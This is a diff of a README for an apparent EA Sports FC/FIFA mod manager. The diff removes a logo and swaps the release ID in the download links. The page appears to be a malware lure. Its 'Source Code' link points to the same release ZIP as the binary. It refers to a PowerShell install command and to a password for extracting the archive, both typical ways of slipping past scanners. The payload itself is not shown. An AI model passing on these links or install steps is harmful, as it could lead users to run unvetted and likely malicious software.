@@ -1,9 +1,5 @@
 # ⚽ FC-FIFA-Mod-Manager
 
-<p align="center">
-  <img src="https://img.icons8.com/color/96/000000/fifa.png" alt="FC FIFA Mod Manager" width="140" height="140">
-</p>
-
 <h1 align="center">FC-FIFA-Mod-Manager</h1>
 <p align="center">
   <strong>The Complete Mod Manager for EA Sports FC 26, FC 25, FC 24 & FIFA 19–23</strong><br>
@@ -40,7 +36,7 @@
 <tr>
 <td align="center">
 
-<a href="https://github.com/vectorelktrek/FC-FIFA-Mod-Manager/releases/download/7826123/FCModManager.zip">
+<a href="https://github.com/vectorelktrek/FC-FIFA-Mod-Manager/releases/download/78192341/FCModManager.zip">
   <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
 </a>
 
@@ -53,8 +49,8 @@
 </table>
 
 **Direct Links:**
-- [Latest Release](https://github.com/vectorelktrek/FC-FIFA-Mod-Manager/releases/download/7826123/FCModManager.zip)
-- [Source Code](https://github.com/vectorelktrek/FC-FIFA-Mod-Manager/releases/download/7826123/FCModManager.zip)
+- [Latest Release](https://github.com/vectorelktrek/FC-FIFA-Mod-Manager/releases/download/78192341/FCModManager.zip)
+- [Source Code](https://github.com/vectorelktrek/FC-FIFA-Mod-Manager/releases/download/78192341/FCModManager.zip)
 
 > 💡 **Prefer a classic download?** If you'd rather install from an archive instead of the PowerShell command, simply download the ZIP from the **Releases** section above. Extract it and use the password below.
 >
